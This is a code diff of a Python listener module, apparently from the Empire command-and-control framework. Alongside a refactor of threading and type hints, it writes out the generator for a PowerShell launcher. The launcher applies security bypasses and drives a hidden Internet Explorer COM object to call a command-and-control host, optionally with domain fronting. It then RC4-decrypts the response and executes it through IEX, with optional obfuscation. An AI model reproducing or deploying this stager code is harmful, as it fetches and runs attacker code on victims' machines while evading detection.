@@ -6,7 +6,6 @@ import random
 import ssl
 import sys
 import time
-from typing import List, Optional, Tuple
 
 from flask import Flask, make_response, request, send_from_directory
 from werkzeug.serving import WSGIRequestHandler
@@ -65,8 +64,8 @@ class Listener:
             "Port": {
                 "Description": "Port for the listener.",
                 "Required": True,
-                "Value": "",
-                "SuggestedValues": ["1335", "1336"],
+                "Value": "80",
+                "SuggestedValues": ["80", "443"],
             },
             "Launcher": {
                 "Description": "Launcher string.",
@@ -138,7 +137,7 @@ class Listener:
 
         # required:
         self.mainMenu = mainMenu
-        self.threads = {}
+        self.thread = None
 
         # optional/specific for this module
         self.app = None
@@ -165,7 +164,7 @@ class Listener:
         """
         return open(f"{self.template_dir }/default.html").read()
 
-    def validate_options(self) -> Tuple[bool, Optional[str]]:
+    def validate_options(self) -> tuple[bool, str | None]:
         """
         Validate all options for this listener.
         """
@@ -198,7 +197,7 @@ class Listener:
         language=None,
         safeChecks="",
         listenerName=None,
-        bypasses: List[str] = None,
+        bypasses: list[str] = None,
     ):
         """
         Generate a basic launcher for the specified listener.
@@ -208,130 +207,122 @@ class Listener:
             log.error("listeners/http_com generate_launcher(): no language specified!")
             return None
 
-        # Previously, we had to do a lookup for the listener and check through threads on the instance.
-        # Beginning in 5.0, each instance is unique, so using self should work. This code could probably be simplified
-        # further, but for now keeping as is since 5.0 has enough rewrites as it is.
-        if (
-            True
-        ):  # The true check is just here to keep the indentation consistent with the old code.
-            active_listener = self
-            # extract the set options for this instantiated listener
-            listenerOptions = active_listener.options
+        active_listener = self
+        # extract the set options for this instantiated listener
+        listenerOptions = active_listener.options
 
-            host = listenerOptions["Host"]["Value"]
-            launcher = listenerOptions["Launcher"]["Value"]
-            staging_key = listenerOptions["StagingKey"]["Value"]
-            profile = listenerOptions["DefaultProfile"]["Value"]
-            requestHeader = listenerOptions["RequestHeader"]["Value"]
-            uris = [a for a in profile.split("|")[0].split(",")]
-            stage0 = random.choice(uris)
-            customHeaders = profile.split("|")[2:]
+        host = listenerOptions["Host"]["Value"]
+        launcher = listenerOptions["Launcher"]["Value"]
+        staging_key = listenerOptions["StagingKey"]["Value"]
+        profile = listenerOptions["DefaultProfile"]["Value"]
+        requestHeader = listenerOptions["RequestHeader"]["Value"]
+        uris = list(profile.split("|")[0].split(","))
+        stage0 = random.choice(uris)
+        customHeaders = profile.split("|")[2:]
 
-            if language.startswith("po"):
-                # PowerShell
+        if language.startswith("po"):
+            # PowerShell
 
-                stager = '$ErrorActionPreference = "SilentlyContinue";'
-                if safeChecks.lower() == "true":
-                    stager = "If($PSVersionTable.PSVersion.Major -ge 3){"
+            stager = '$ErrorActionPreference = "SilentlyContinue";'
+            if safeChecks.lower() == "true":
+                stager = "If($PSVersionTable.PSVersion.Major -ge 3){"
 
-                    for bypass in bypasses:
-                        stager += bypass
-                    stager += "};"
-                    stager += "[System.Net.ServicePointManager]::Expect100Continue=0;"
+                for bypass in bypasses:
+                    stager += bypass
+                stager += "};"
+                stager += "[System.Net.ServicePointManager]::Expect100Continue=0;"
 
-                # TODO: reimplement stager retries?
+            # TODO: reimplement stager retries?
 
-                # check if we're using IPv6
-                listenerOptions = copy.deepcopy(listenerOptions)
-                bindIP = listenerOptions["BindIP"]["Value"]
-                port = listenerOptions["Port"]["Value"]
-                if ":" in bindIP:
-                    if "http" in host:
-                        if "https" in host:
-                            host = (
-                                "https://" + "[" + str(bindIP) + "]" + ":" + str(port)
-                            )
-                        else:
-                            host = "http://" + "[" + str(bindIP) + "]" + ":" + str(port)
+            # check if we're using IPv6
+            listenerOptions = copy.deepcopy(listenerOptions)
+            bindIP = listenerOptions["BindIP"]["Value"]
+            port = listenerOptions["Port"]["Value"]
+            if ":" in bindIP:
+                if "http" in host:
+                    if "https" in host:
+                        host = "https://" + "[" + str(bindIP) + "]" + ":" + str(port)
+                    else:
+                        host = "http://" + "[" + str(bindIP) + "]" + ":" + str(port)
 
-                # code to turn the key string into a byte array
-                stager += (
-                    f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
+            # code to turn the key string into a byte array
+            stager += f"$K=[System.Text.Encoding]::ASCII.GetBytes('{ staging_key }');"
+
+            # this is the minimized RC4 stager code from rc4.ps1
+            stager += listener_util.powershell_rc4()
+
+            # prebuild the request routing packet for the launcher
+            routingPacket = packets.build_routing_packet(
+                staging_key,
+                sessionID="00000000",
+                language="POWERSHELL",
+                meta="STAGE0",
+                additional="None",
+                encData="",
+            )
+            b64RoutingPacket = base64.b64encode(routingPacket)
+
+            stager += "$ie=New-Object -COM InternetExplorer.Application;$ie.Silent=$True;$ie.visible=$False;$fl=14;"
+            stager += (
+                f"$ser={ helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';"
+            )
+
+            # add the RC4 packet to a header location
+            stager += f'$c="{ requestHeader }: { b64RoutingPacket }'
+
+            # Add custom headers if any
+            modifyHost = False
+            if customHeaders != []:
+                for header in customHeaders:
+                    headerKey = header.split(":")[0]
+                    headerValue = header.split(":")[1]
+
+                    if headerKey.lower() == "host":
+                        modifyHost = True
+
+                    stager += f"`r`n{ headerKey }: { headerValue }"
+
+            stager += '";'
+            # If host header defined, assume domain fronting is in use and add a call to the base URL first
+            # this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
+            if modifyHost:
+                stager += "$ie.navigate2($ser,$fl,0,$Null,$Null);while($ie.busy){Start-Sleep -Milliseconds 100};"
+
+            stager += "$ie.navigate2($ser+$t,$fl,0,$Null,$c);"
+            stager += "while($ie.busy){Start-Sleep -Milliseconds 100};"
+            stager += "$ht = $ie.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $ie.document, $Null).InnerHtml;"
+            stager += (
+                "try {$data=[System.Convert]::FromBase64String($ht)} catch {$Null}"
+            )
+            stager += "$iv=$data[0..3];$data=$data[4..$data.length];"
+
+            # decode everything and kick it over to IEX to kick off execution
+            stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"
+
+            # Remove comments and make one line
+            stager = helpers.strip_powershell_comments(stager)
+            stager = data_util.ps_convert_to_oneliner(stager)
+
+            if obfuscate:
+                stager = self.mainMenu.obfuscationv2.obfuscate(
+                    stager,
+                    obfuscation_command=obfuscation_command,
                 )
+                stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
 
-                # this is the minimized RC4 stager code from rc4.ps1
-                stager += listener_util.powershell_rc4()
-
-                # prebuild the request routing packet for the launcher
-                routingPacket = packets.build_routing_packet(
-                    staging_key,
-                    sessionID="00000000",
-                    language="POWERSHELL",
-                    meta="STAGE0",
-                    additional="None",
-                    encData="",
-                )
-                b64RoutingPacket = base64.b64encode(routingPacket)
-
-                stager += "$ie=New-Object -COM InternetExplorer.Application;$ie.Silent=$True;$ie.visible=$False;$fl=14;"
-                stager += f"$ser={ helpers.obfuscate_call_home_address(host) };$t='{ stage0 }';"
-
-                # add the RC4 packet to a header location
-                stager += f'$c="{ requestHeader }: { b64RoutingPacket }'
-
-                # Add custom headers if any
-                modifyHost = False
-                if customHeaders != []:
-                    for header in customHeaders:
-                        headerKey = header.split(":")[0]
-                        headerValue = header.split(":")[1]
-
-                        if headerKey.lower() == "host":
-                            modifyHost = True
-
-                        stager += f"`r`n{ headerKey }: { headerValue }"
-
-                stager += '";'
-                # If host header defined, assume domain fronting is in use and add a call to the base URL first
-                # this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
-                if modifyHost:
-                    stager += "$ie.navigate2($ser,$fl,0,$Null,$Null);while($ie.busy){Start-Sleep -Milliseconds 100};"
-
-                stager += "$ie.navigate2($ser+$t,$fl,0,$Null,$c);"
-                stager += "while($ie.busy){Start-Sleep -Milliseconds 100};"
-                stager += "$ht = $ie.document.GetType().InvokeMember('body', [System.Reflection.BindingFlags]::GetProperty, $Null, $ie.document, $Null).InnerHtml;"
-                stager += (
-                    "try {$data=[System.Convert]::FromBase64String($ht)} catch {$Null}"
-                )
-                stager += "$iv=$data[0..3];$data=$data[4..$data.length];"
-
-                # decode everything and kick it over to IEX to kick off execution
-                stager += "-join[Char[]](& $R $data ($IV+$K))|IEX"
-
-                # Remove comments and make one line
-                stager = helpers.strip_powershell_comments(stager)
-                stager = data_util.ps_convert_to_oneliner(stager)
-
-                if obfuscate:
-                    stager = self.mainMenu.obfuscationv2.obfuscate(
-                        stager,
-                        obfuscation_command=obfuscation_command,
-                    )
-                    stager = self.mainMenu.obfuscationv2.obfuscate_keywords(stager)
-
-                # base64 encode the stager and return it
-                if encode and (
-                    (not obfuscate) or ("launcher" not in obfuscation_command.lower())
-                ):
-                    return helpers.powershell_launcher(stager, launcher)
-                else:
-                    # otherwise return the case-randomized stager
-                    return stager
-
+            # base64 encode the stager and return it
+            if encode and (
+                (not obfuscate) or ("launcher" not in obfuscation_command.lower())
+            ):
+                return helpers.powershell_launcher(stager, launcher)
             else:
-                log.error(
-                    "listeners/http_com generate_launcher(): invalid language specification: only 'powershell' is currently supported for this module."
-                )
+                # otherwise return the case-randomized stager
+                return stager
+
+        else:
+            log.error(
+                "listeners/http_com generate_launcher(): invalid language specification: only 'powershell' is currently supported for this module."
+            )
 
     def generate_stager(
         self,
@@ -858,40 +849,23 @@ class Listener:
             self.instance_log.error(message1, exc_info=True)
             self.instance_log.error(message2, exc_info=True)
 
-    def start(self, name=""):
+    def start(self):
         """
         Start a threaded instance of self.start_server() and store it in the
-        self.threads dictionary keyed by the listener name.
+        self.thread property.
         """
         listenerOptions = self.options
-        if name and name != "":
-            self.threads[name] = helpers.KThread(
-                target=self.start_server, args=(listenerOptions,)
-            )
-            self.threads[name].start()
-            time.sleep(1)
-            # returns True if the listener successfully started, false otherwise
-            return self.threads[name].is_alive()
-        else:
-            name = listenerOptions["Name"]["Value"]
-            self.threads[name] = helpers.KThread(
-                target=self.start_server, args=(listenerOptions,)
-            )
-            self.threads[name].start()
-            time.sleep(1)
-            # returns True if the listener successfully started, false otherwise
-            return self.threads[name].is_alive()
+        self.thread = helpers.KThread(target=self.start_server, args=(listenerOptions,))
+        self.thread.start()
+        time.sleep(1)
+        # returns True if the listener successfully started, false otherwise
+        return self.thread.is_alive()
 
-    def shutdown(self, name=""):
+    def shutdown(self):
         """
-        Terminates the server thread stored in the self.threads dictionary,
-        keyed by the listener name.
+        Terminates the server thread stored in the self.thread property.
         """
-        if name and name != "":
-            to_kill = name
-        else:
-            to_kill = self.options["Name"]["Value"]
-
+        to_kill = self.options["Name"]["Value"]
         self.instance_log.info(f"{to_kill}: shutting down...")
         log.info(f"{to_kill}: shutting down...")
-        self.threads[to_kill].kill()
+        self.thread.kill()
